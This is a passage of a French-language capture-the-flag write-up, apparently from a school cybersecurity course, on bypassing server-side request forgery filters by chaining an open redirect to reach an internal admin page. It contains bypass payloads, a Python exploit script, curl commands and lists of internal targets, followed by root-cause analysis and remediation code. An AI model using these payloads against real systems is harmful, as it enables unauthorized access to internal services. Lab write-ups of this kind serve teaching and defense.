- Découverte de la nouvelle fonctionnalité de navigation

##### 2. Analyse des protections en place

Tests de sécurité pour comprendre les filtres :

```http
POST /app4-1/check-discount HTTP/1.1
Host: web0x08.hbtn
Content-Type: application/x-www-form-urlencoded

# Test 1 : localhost direct (bloqué)
articleApi=http://localhost:8080/admin

# Test 2 : IP décimale (bloqué)
articleApi=http://2130706433:8080/admin

# Test 3 : Bypass avec @ (bloqué)
articleApi=http://localhost@allowed.domain:8080/admin

# Test 4 : Notation raccourcie (bloqué)
articleApi=http://127.1:8080/admin
```

**Résultat** : Tous les payloads classiques sont **bloqués** → Les nouvelles couches de sécurité sont efficaces !

Les protections implémentées semblent inclure :
1. ✅ Allowlist stricte des domaines
2. ✅ Détection et blocage des credentials (caractère `@`)
3. ✅ Validation et résolution DNS
4. ✅ Blocage des IP privées, loopback, et toutes leurs variantes

##### 3. Découverte de la nouvelle fonctionnalité

**Exploration de l'application** :

En naviguant dans les produits, on découvre une nouvelle fonctionnalité :
- URL pattern : `/app4-1/product/1`, `/app4-1/product/2`, etc.
- Bouton ou lien "Next Product" ou "Navigate"
- Endpoint : `/app4-1/product/nextProduct?path=...`

**Test de la fonctionnalité** :

```http
GET /app4-1/product/nextProduct?path=/app4-1/product/2 HTTP/1.1
Host: web0x08.hbtn

# Résultat : Redirection vers le produit 2
```

**Observation clé** : Le paramètre `path` permet de rediriger vers une URL arbitraire !

##### 4. Exploitation : Chaînage de redirection

**Stratégie** :
1. Utiliser `articleApi` pour pointer vers la fonctionnalité de navigation légitime
2. La fonctionnalité de navigation redirige vers `localhost:8080`
3. Le filtre valide le premier niveau (URL légitime) mais pas la redirection

**Payload gagnant** :

```http
POST /app4-1/check-discount HTTP/1.1
Host: web0x08.hbtn
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 90
Referer: http://web0x08.hbtn/app4-1/product/1
Origin: http://web0x08.hbtn

articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://localhost:8080/admin
```

**Décomposition de l'attaque** :

```
1. Filtre de sécurité analyse articleApi :
   URL = http://web0x08.hbtn/app4-1/product/nextProduct?path=...
   ├─ hostname = "web0x08.hbtn" ✅ (Domaine autorisé)
   ├─ path = "/app4-1/product/nextProduct" ✅ (Endpoint légitime)
   ├─ Pas de credentials (@) ✅
   └─ Validation réussie → AUTORISÉ ✅

2. Backend effectue la requête :
   GET /app4-1/product/nextProduct?path=http://localhost:8080/admin

3. L'endpoint nextProduct traite le paramètre path :
   ├─ Fonction : redirection ou fetch de l'URL fournie
   ├─ Pas de validation sur le paramètre path ! ⚠️
   └─ Effectue une requête vers http://localhost:8080/admin

4. Application interne sur localhost:8080 :
   ├─ Reçoit GET /admin
   ├─ Pas d'authentification (accès localhost considéré sûr)
   └─ Retourne le contenu avec FLAG_3

5. Réponse remonte la chaîne et arrive à l'attaquant
```

##### 5. Extraction du flag

**Réponse HTTP** :

```http
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Fri, 12 Dec 2025 11:24:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 84
Connection: keep-alive
X-Powered-By: Express
ETag: W/"54-m8Oxg8X6KMHyhWYAN1OpTgaqiTs"

<h1> The goal is achieved, well done. FLAG_3  5b12acbe2861920a6bfaf30d89d17fa5 </h1>
```

**Flag récupéré** : `5b12acbe2861920a6bfaf30d89d17fa5`

#### Variantes d'exploitation

Plusieurs endpoints de redirection peuvent être testés :

```bash
# 1. nextProduct (celui qui fonctionne)
articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://localhost:8080/admin

# 2. navigate (possible alternative)
articleApi=http://web0x08.hbtn/app4-1/navigate?to=http://localhost:8080/admin

# 3. redirect (possible alternative)
articleApi=http://web0x08.hbtn/app4-1/redirect?url=http://localhost:8080/admin

# 4. goto (possible alternative)
articleApi=http://web0x08.hbtn/app4-1/goto?target=http://localhost:8080/admin
```

**Targets internes à tester sur localhost:8080** :

```bash
# Endpoints admin
http://localhost:8080/admin
http://localhost:8080/admin/dashboard
http://localhost:8080/admin/users

# Endpoints API
http://localhost:8080/api/secret
http://localhost:8080/api/internal
http://localhost:8080/api/flag

# Endpoints de configuration
http://localhost:8080/config
http://localhost:8080/internal
http://localhost:8080/debug
```

#### Script d'exploitation automatique

```python
#!/usr/bin/env python3
import requests
import re

# Configuration
base_url = "http://web0x08.hbtn"
check_discount_url = f"{base_url}/app4-1/check-discount"

# Headers complets
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": f"{base_url}/app4-1/product/1",
    "Origin": base_url,
}

# Différents endpoints de redirection à tester
redirect_endpoints = [
    "/app4-1/product/nextProduct?path=",
    "/app4-1/navigate?to=",
    "/app4-1/redirect?url=",
    "/app4-1/goto?target=",
]

# Targets internes sur localhost:8080
internal_targets = [
    "http://localhost:8080/admin",
    "http://localhost:8080/admin/dashboard",
    "http://localhost:8080/api/flag",
    "http://localhost:8080/internal",
    "http://127.0.0.1:8080/admin",
]

print("[*] Starting SSRF exploitation via redirect chaining...")
print(f"[*] Target: {check_discount_url}\n")

for redirect_ep in redirect_endpoints:
    print(f"[*] Testing redirect endpoint: {redirect_ep}")

    for target in internal_targets:
        # Construire le payload
        payload_url = f"{base_url}{redirect_ep}{target}"
        data = {"articleApi": payload_url}

        print(f"    [*] Payload: {payload_url}")

        try:
            response = requests.post(
                check_discount_url,
                data=data,
                headers=headers,
                timeout=10,
                allow_redirects=True
            )

            print(f"        Status: {response.status_code}")

            # Recherche du flag
            if "FLAG_3" in response.text or re.search(r'[a-f0-9]{32}', response.text):
                print(f"\n[!] POTENTIAL FLAG FOUND!")
                print(f"[+] Redirect endpoint: {redirect_ep}")
                print(f"[+] Internal target: {target}")
                print(f"[+] Response:\n{response.text}\n")

                # Extraire le flag
                flag_match = re.search(r'FLAG_3\s+([a-f0-9]{32})', response.text)
                if not flag_match:
                    flag_match = re.search(r'([a-f0-9]{32})', response.text)

                if flag_match:
                    flag = flag_match.group(1)
                    print(f"[+] Flag extracted: {flag}")

                    # Sauvegarder le flag
                    with open("3-flag.txt", "w") as f:
                        f.write(flag + "\n")
                    print(f"[+] Flag saved to 3-flag.txt")
                    exit(0)

        except Exception as e:
            print(f"        Error: {e}")

print("\n[*] Exploitation completed!")
```

#### Commandes curl

```bash
# Exploitation directe
curl -X POST "http://web0x08.hbtn/app4-1/check-discount" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
  -H "Referer: http://web0x08.hbtn/app4-1/product/1" \
  -H "Origin: http://web0x08.hbtn" \
  -d "articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://localhost:8080/admin"

# Sauvegarder la réponse
curl -X POST "http://web0x08.hbtn/app4-1/check-discount" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://web0x08.hbtn/app4-1/product/1" \
  -d "articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://localhost:8080/admin" \
  -o flag3.html

# Extraire le flag
grep -oP 'FLAG_3\s+\K[a-f0-9]{32}' flag3.html
```

#### Analyse de la vulnérabilité

**Type de vulnérabilité** : SSRF via Open Redirect + Server-Side Request Forgery

**Architecture vulnérable** :

```
┌─────────────────────────────────────────────────────────────┐
│                    Attaquant                                 │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       │ POST /app4-1/check-discount
                       │ articleApi=http://web0x08.hbtn/app4-1/product/nextProduct?path=http://localhost:8080/admin
                       ▼
┌─────────────────────────────────────────────────────────────┐
│              Filtre de sécurité (COUCHE 1)                   │
│  ┌──────────────────────────────────────────────────┐       │
│  │ ✅ Vérification allowlist : web0x08.hbtn         │       │
│  │ ✅ Pas de credentials (@)                         │       │
│  │ ✅ DNS résolution : IP publique                   │       │
│  │ ✅ Path légitime : /app4-1/product/nextProduct    │       │
│  └──────────────────────────────────────────────────┘       │
│                  Validation RÉUSSIE ✅                       │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       │ GET /app4-1/product/nextProduct?path=http://localhost:8080/admin
                       ▼
┌─────────────────────────────────────────────────────────────┐
│         Feature de navigation (COUCHE 2 - VULNÉRABLE)       │
│  ┌──────────────────────────────────────────────────┐       │
│  │ ❌ Aucune validation du paramètre 'path' !       │       │
│  │ ❌ Redirection/Fetch aveugle                      │       │
│  └──────────────────────────────────────────────────┘       │
│              Effectue requête vers path...                   │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       │ GET /admin
                       ▼
┌─────────────────────────────────────────────────────────────┐
│         Application interne (localhost:8080)                 │
│  ┌──────────────────────────────────────────────────┐       │
│  │ ❌ Pas d'authentification (localhost = trusted)   │       │
│  │ ✅ Retourne FLAG_3                                │       │
│  └──────────────────────────────────────────────────┘       │
└──────────────────────┬──────────────────────────────────────┘
                       │
                       │ Response: FLAG_3
                       ▼
               Attaquant reçoit le flag
```

**Cause première** :

1. **Validation en couches découplées** :
   - La couche de sécurité SSRF valide `articleApi`
   - Mais ne valide PAS les paramètres des endpoints internes (comme `path`)

2. **Open Redirect non sécurisée** :
   - L'endpoint `/product/nextProduct` accepte n'importe quelle URL dans `path`
   - Pas de liste blanche sur les destinations de redirection
   - Fonction de redirection/fetch sans validation

3. **Trust implicite** :
   - Le filtre SSRF fait confiance aux endpoints internes de l'application
   - Assume que `/product/nextProduct` est sûr car sur le domaine autorisé
   - Ne vérifie pas les paramètres de query string

**Code vulnérable (hypothétique)** :

```javascript
// ❌ ENDPOINT DE NAVIGATION VULNÉRABLE
app.get('/app4-1/product/nextProduct', (req, res) => {
    const targetPath = req.query.path;

    // Aucune validation du path ! ⚠️
    // Redirection ou fetch aveugle

    if (targetPath.startsWith('http')) {
        // Fetch externe
        fetch(targetPath)
            .then(response => response.text())
            .then(data => res.send(data));
    } else {
        // Redirection interne
        res.redirect(targetPath);
    }
});

// ❌ FILTRE SSRF INCOMPLET
function validateArticleApi(url) {
    const parsed = new URL(url);

    // Vérifie uniquement le hostname principal
    if (parsed.hostname !== 'web0x08.hbtn') {
        throw new Error('Domain not allowed');
    }

    // ❌ Ne vérifie PAS les paramètres de query !
    // articleApi=http://web0x08.hbtn/redirect?url=http://localhost:8080/admin
    //                                              ^^^^^^^^^^^^^^^^^^^^^^^^
    //                                              Non validé !

    if (parsed.username || parsed.password) {
        throw new Error('Credentials not allowed');
    }

    return true;
}
```

**Impact** :

- ✅ Bypass complet de TOUTES les couches de sécurité SSRF
- ✅ Accès aux services internes sur localhost:8080
- ✅ Exfiltration de données sensibles (flag, configs, etc.)
- ⚠️ Une chaîne de sécurité est aussi forte que son maillon le plus faible
- ⚠️ Les nouvelles fonctionnalités peuvent introduire de nouvelles vulnérabilités

**Pourquoi cette attaque fonctionne** :

```
Filtre SSRF :
  "articleApi pointe vers web0x08.hbtn ? ✅ OK"
  "Pas de credentials @ ? ✅ OK"
  "IP publique ? ✅ OK"
  → AUTORISÉ

Feature de navigation :
  "Path parameter = http://localhost:8080/admin"
  "Pas de validation... Je fais la requête !"
  → SSRF RÉUSSIE

Leçon : Le filtre valide l'URL principale mais pas
        les paramètres qui eux-mêmes contiennent des URLs !
```

#### Remédiation correcte

**✅ Niveau 1 : Valider TOUS les paramètres contenant des URLs**

```javascript
// Fonction de validation complète
function isValidURL(url) {
    const ALLOWED_DOMAINS = ['web0x08.hbtn', 'api.shop.com'];
    const ALLOWED_PORTS = [80, 443];

    try {
        const parsed = new URL(url);

        // 1. Vérifier le domaine
        if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
            return false;
        }

        // 2. Bloquer credentials
        if (parsed.username || parsed.password) {
            return false;
        }

        // 3. Vérifier l'IP (pas privée)
        const ip = dns.resolve4(parsed.hostname)[0];
        if (isPrivateIP(ip)) {
            return false;
        }

        // 4. Restreindre les ports
        const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
        if (!ALLOWED_PORTS.includes(port)) {
            return false;
        }

        return true;

    } catch (error) {
        return false;
    }
}

// ✅ VALIDATION RÉCURSIVE DES PARAMÈTRES
app.post('/app4-1/check-discount', (req, res) => {
    const articleApiUrl = req.body.articleApi;

    // Valider l'URL principale
    if (!isValidURL(articleApiUrl)) {
        return res.status(400).json({ error: 'Invalid URL' });
    }

    // ⚠️ NOUVEAU : Valider les paramètres de query
    const parsed = new URL(articleApiUrl);
    const queryParams = parsed.searchParams;

    // Vérifier si des paramètres ressemblent à des URLs
    for (const [key, value] of queryParams) {
        if (value.startsWith('http://') || value.startsWith('https://')) {
            // Valider récursivement cette URL aussi !
            if (!isValidURL(value)) {
                return res.status(400).json({
                    error: `Invalid URL in parameter '${key}'`
                });
            }
        }
    }

    // Effectuer la requête seulement si toutes les validations passent
    fetch(articleApiUrl, { redirect: 'manual' })
        .then(response => response.text())
        .then(data => res.send(data));
});
```

**✅ Niveau 2 : Sécuriser l'endpoint de navigation**

```javascript
// ✅ ENDPOINT DE NAVIGATION SÉCURISÉ
app.get('/app4-1/product/nextProduct', (req, res) => {
    const targetPath = req.query.path;

    // 1. Accepter uniquement les chemins relatifs
    if (targetPath.startsWith('http://') || targetPath.startsWith('https://')) {
        return res.status(400).json({
            error: 'External URLs not allowed. Use relative paths only.'
        });
    }

    // 2. Valider que le chemin est interne
    const ALLOWED_PATHS = [
        /^\/app4-1\/product\/\d+$/,  // /app4-1/product/123
        /^\/app4-1\/category\/\w+$/,  // /app4-1/category/electronics
    ];

    const isAllowed = ALLOWED_PATHS.some(pattern => pattern.test(targetPath));

    if (!isAllowed) {
        return res.status(403).json({ error: 'Path not allowed' });
    }

    // 3. Redirection sécurisée (interne seulement)
    res.redirect(targetPath);
});

// Alternative : Pas de paramètre path du tout !
app.get('/app4-1/product/:id/next', (req, res) => {
    const currentId = parseInt(req.params.id);
    const nextId = currentId + 1;

    // Redirection hard-codée, pas de paramètre utilisateur
    res.redirect(`/app4-1/product/${nextId}`);
});
```

**✅ Niveau 3 : Architecture de sécurité en profondeur**

```javascript
// 1. Proxy sortant contrôlé
const EGRESS_PROXY = 'http://secure-proxy:8888';

function fetchExternal(url) {
    return fetch(url, {
        agent: new HttpsProxyAgent(EGRESS_PROXY),
        redirect: 'manual',  // Ne jamais suivre les redirections
        timeout: 5000,
    });
}

// 2. Network policies (Kubernetes/Firewall)
/*
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-internal-egress
spec:
  podSelector:
    matchLabels:
      app: shopadin-web
  policyTypes:
  - Egress
  egress:
  - to:
    - podSelector: {}  # Pods in same namespace
    ports:
    - protocol: TCP
      port: 80
    - protocol: TCP
      port: 443
  # Bloquer 127.0.0.1, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
*/

// 3. Content Security Policy pour les réponses
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', "default-src 'self'");
    res.setHeader('X-Frame-Options', 'DENY');
    next();
});

// 4. Logging et monitoring
function logSSRFAttempt(url, result) {
    logger.warn('SSRF validation', {
        url,
        result,
        timestamp: new Date(),
        ip: req.ip,
        user: req.user?.id
    });

    // Alerter si tentative suspecte
    if (result === 'blocked') {
        securityMonitor.alert('SSRF_ATTEMPT', { url, ip: req.ip });
    }
}
```

**✅ Checklist de sécurité SSRF complète**

```
☑️ Valider le domaine/hostname (allowlist)
☑️ Bloquer les credentials (@, :)
☑️ Résoudre le DNS et vérifier que l'IP n'est pas privée
☑️ Valider le schéma (http/https uniquement)
☑️ Restreindre les ports autorisés
☑️ Désactiver les redirections HTTP
☑️ Valider RÉCURSIVEMENT les paramètres de query
☑️ Pas d'Open Redirect sur les endpoints internes
☑️ Timeout court sur les requêtes externes
☑️ Proxy sortant contrôlé
☑️ Network policies (firewall)
☑️ Logging et monitoring
☑️ Ne jamais retourner la réponse brute (filtrer les données)
```

**Leçons clés** :

1. **Valider récursivement** - Les URLs peuvent contenir d'autres URLs dans leurs paramètres
2. **Pas d'Open Redirect** - Même sur vos propres endpoints, ne redirigez jamais vers des URLs arbitraires
3. **Defense in depth** - Multiples couches : validation app + réseau + monitoring
4. **Nouvelles features = nouveaux risques** - Chaque fonctionnalité ajoutée doit être évaluée pour la sécurité
5. **Trust boundaries** - Ne jamais faire confiance aveuglément aux paramètres, même sur des endpoints internes

**Fichier** : [3-flag.txt](3-flag.txt)

---

## Auteur

**Projet Holberton School - Cybersecurity Specialization**

---

## Licence

Usage éducatif uniquement
